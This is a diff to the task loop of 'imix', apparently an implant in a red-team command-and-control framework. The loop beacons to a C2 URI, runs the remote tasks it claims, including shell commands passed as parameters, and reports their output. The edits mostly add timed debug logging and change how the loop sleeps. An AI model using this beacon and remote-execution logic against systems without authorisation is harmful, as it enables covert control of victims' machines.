@@ -233,6 +233,7 @@ async fn main_loop(config_path: String, run_once: bool) -> Result<()> {
     };
 
     loop {
+        let start_time = Utc::now().time();
         // 0. Get loop start time
         let loop_start_time = Instant::now();
         if debug { println!("Get new tasks"); }
@@ -240,6 +241,7 @@ async fn main_loop(config_path: String, run_once: bool) -> Result<()> {
         // 1a) calculate callback uri
         let cur_callback_uri = imix_config.callback_config.c2_configs[0].uri.clone();
 
+        if debug { println!("[{}]: collecting tasks", (Utc::now().time() - start_time).num_milliseconds()) }
         // 1b) Collect new tasks
         let new_tasks = match graphql::gql_claim_tasks(cur_callback_uri.clone(), claim_tasks_input.clone()).await {
             Ok(tasks) => tasks,
@@ -252,7 +254,7 @@ async fn main_loop(config_path: String, run_once: bool) -> Result<()> {
             },
         };
 
-        if debug { println!("Starting {} new tasks", new_tasks.len()); }
+        if debug { println!("[{}]: Starting {} new tasks", (Utc::now().time() - start_time).num_milliseconds(), new_tasks.len()); }
         // 2. Start new tasks
         for task in new_tasks {
             if debug { println!("Launching:\n{:?}", task.clone().job.unwrap().tome.eldritch); }
@@ -279,23 +281,21 @@ async fn main_loop(config_path: String, run_once: bool) -> Result<()> {
         }
         // 3. Sleep till callback time
         //                                  time_to_wait          -         time_elapsed
-        let time_to_sleep = imix_config.callback_config.interval - loop_start_time.elapsed().as_secs() ;
-        if debug { println!("Sleeping {}", time_to_sleep); }
-        tokio::time::sleep(std::time::Duration::new(time_to_sleep, 24601)).await; // This seems to wait for other threads to finish.
-        // std::thread::sleep(std::time::Duration::new(time_to_sleep, 24601)); // This just sleeps our thread.
+        let time_to_sleep = imix_config.callback_config.interval - loop_start_time.elapsed().as_secs();
+        if debug { println!("[{}]: Sleeping seconds {}", (Utc::now().time() - start_time).num_milliseconds(), time_to_sleep); }
+        // tokio::time::sleep(std::time::Duration::new(time_to_sleep, 24601)).await; // This seems to wait for other threads to finish.
+        std::thread::sleep(std::time::Duration::new(time_to_sleep, 24601)); // This just sleeps our thread.
 
         // :clap: :clap: make new map!
         let mut running_exec_futures: HashMap<String, ExecTask> = HashMap::new();
 
-        if debug { println!("Checking status"); }
+        if debug { println!("[{}]: Checking task status", (Utc::now().time() - start_time).num_milliseconds()); }
         // Check status & send response
         for exec_future in all_exec_futures.into_iter() {
-            if debug {
-                println!("{}: {:?}", exec_future.0, exec_future.1.future_join_handle.is_finished());
-            }
+            if debug { println!("[{}]: Task # {} is_finished? {}", (Utc::now().time() - start_time).num_milliseconds(), exec_future.0, exec_future.1.future_join_handle.is_finished()); }
             let mut res: Vec<String> = vec![];
             loop {
-                if debug { println!("Reciveing output"); }
+                if debug { println!("[{}]: Task # {} recieving output", (Utc::now().time() - start_time).num_milliseconds(), exec_future.0); }
                 let new_res_line =  match exec_future.1.print_reciever.recv_timeout(Duration::from_millis(100)) {
                     Ok(local_res_string) => local_res_string,
                     Err(local_err) => {
@@ -330,16 +330,14 @@ async fn main_loop(config_path: String, run_once: bool) -> Result<()> {
                     }
                 },
             };
-            if debug {
-                println!("{}", task_response.output);
-            }
+            if debug { println!("[{}]: Task {} output: {}", (Utc::now().time() - start_time).num_milliseconds(), exec_future.0, task_response.output); }
             let submit_task_result = graphql::gql_post_task_result(cur_callback_uri.clone(), task_response).await;
             let _ = match submit_task_result {
                 Ok(_) => Ok(()), // Currently no reason to save the task since it's the task we just answered.
                 Err(error) => Err(error),
             };
 
-                // Only re-insert the runnine exec futures
+            // Only re-insert the runnine exec futures
             if !exec_future.1.future_join_handle.is_finished() {
                 running_exec_futures.insert(exec_future.0, exec_future.1);
             }
@@ -541,7 +539,7 @@ sys.shell(input_params["cmd"])
 
         // Define a future for our execution task
         let start_time = Utc::now().time();
-        let exec_future = main_loop(path_new, true);
+        let exec_future = main_loop(path_new, false);
         let _result = runtime.block_on(exec_future).unwrap();
         let end_time = Utc::now().time();
         let diff = (end_time - start_time).num_milliseconds();
